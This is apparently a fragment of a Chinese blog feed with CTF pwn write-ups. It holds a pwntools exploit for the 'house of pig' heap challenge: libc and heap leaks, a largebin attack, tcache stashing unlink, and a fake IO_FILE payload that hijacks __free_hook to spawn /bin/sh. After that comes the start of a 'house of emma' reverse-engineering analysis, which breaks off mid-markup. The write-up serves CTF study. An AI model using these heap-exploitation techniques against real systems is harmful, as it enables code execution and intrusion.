class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">3</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0xa0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin-&gt;smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0x160</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0x160</span></span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0xa0 to 5</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#split into unsorted bin</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>)<span class="comment">#to clear flag0</span></span><br><span class="line">view(<span class="number">7</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x2204a8</span></span><br><span class="line">iolistall = libc_base + <span class="number">0x21a680</span></span><br><span class="line">memset_got = libc_base + <span class="number">0x219188</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))</span><br><span class="line">log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span></span><br><span class="line">delet(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span></span><br><span class="line"><span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span></span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span></span><br><span class="line">delet(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span></span><br><span class="line">fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x160</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">view(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"><span class="comment">#fix it</span></span><br><span class="line">payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack1</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fix largebin&amp;attck2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7</span></span><br><span class="line"><span class="comment">#fix largebin</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache smashing unlink</span></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span></span><br><span class="line"><span class="comment">#gift!</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)</span><br><span class="line"><span class="comment">#fake IOFILE</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size)</span><br><span class="line"></span><br><span class="line">old_buf = fp-&gt;_IO_buf_base</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</span><br></pre></td></tr></table></figure><p>此时<code>_IO_list_all</code>指针已经指向了gift chunk,这个chunk的内容完全是可控的</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p><p>注意前面tcache stashing unlink改的位置，可能需要在__free_hook的地址处加减0x8，因为tcache申请会检查十六字节对齐</p><p>因为我没用原题的glibc,这里我对齐之后，0xe8大小的堆块不够写了，按照出题人的思路应该是刚好够写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = heap_base+<span class="number">0x13da0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2166c0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</span><br></pre></td></tr></table></figure><h3 id="改memset-got做法"><a href="#改memset-got做法" class="headerlink" title="改memset got做法"></a>改memset got做法</h3><p>由于libc是partial RELRO，got表可写</p><p>因此可以把memset的got当作一个__free_hook</p><p>注意这里做tcache stashing unlink时不能直接覆盖memset的got表，这是因为calloc中会调用memset,如果这时的got已经进入tcache,则会变成加密后的fd，rip运行到这里时会报错</p><p>因而正确的做法应该是预留一定的空间，本题限制较大，故不做演示，仅提出思路</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of emma 21湖湘杯复现</title>
      <link href="/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>讲水课，恰大米</p></blockquote><p>沙箱开启，考虑orw</p><p>保护全开</p><h2 id="VM分析"><a href="#VM分析" class="headerlink" title="VM分析"></a>VM分析</h2><p>循环输入，每次读最多0x500，每次循环分配释放0x2000空间</p><p>注意这里每次循环时的malloc,会影响后面的堆风水</p><h3 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h3><p><code>sub_1288</code>处无法识别</p><p>undefine后，由gdb动调知入口在0x1289处，修复为函数</p><p>将输入的字符串指针存在<code>[rbp-18h]</code>处</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720151519060.png" alt="image-20230720151519060"></p><p>随后取第一个byte，与运算0Fh，进行一个没什么用的检查，再将该值*4放入<code>rdx</code>，与一个首地址相加放入<code>eax</code>，符号拓展为<code>rax</code>（因为是负数），再与该首地址相加（<code>rax</code>为补码，实际为相减），其中算负数计算式为<code>hex((~0xfffffffffffff3a1&amp;0xffffffffffffffff)+0x1)</code>，随后跳转到该位置</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720152303704.png" alt="image-20230720152303704"></p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>1488h</td><td>13ddh</td><td>1404h</td><td>1428h</td><td>144ch</td><td>1481h</td><td>12dah</td><td>130dh</td><td>13abh</td><td>1342h</td></tr><tr><td>fail</td><td>add</td><td>delet</td><td>show</td><td>edit</td><td>leave&amp;ret</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230721133000180.png" alt="image-20230721133000180"></p><p>连按d修复跳转表，观察补码可知为4字节一组</p><p>其实可以用ida的edit-&gt;other-&gt;specify switch idiom功能修复为switch</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174743516-1689673665848-1.png" alt="image-20230718174743516"></li><li>+4&amp;jump to start</li></ul><h3 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h3><ul><li><p>index 2nd byte</p></li><li><p>uaf</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174950029.png" alt="image-20230718174950029"></p></li><li><p>+2</p></li></ul><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul><li><p>index 2nd byte</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718175134076.png" alt="image-20230718175134076"></p></li><li><p>+2</p></li></ul><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li>content 2nd dword, size</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230719093944933.png" alt="image-20230719093944933"></li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" 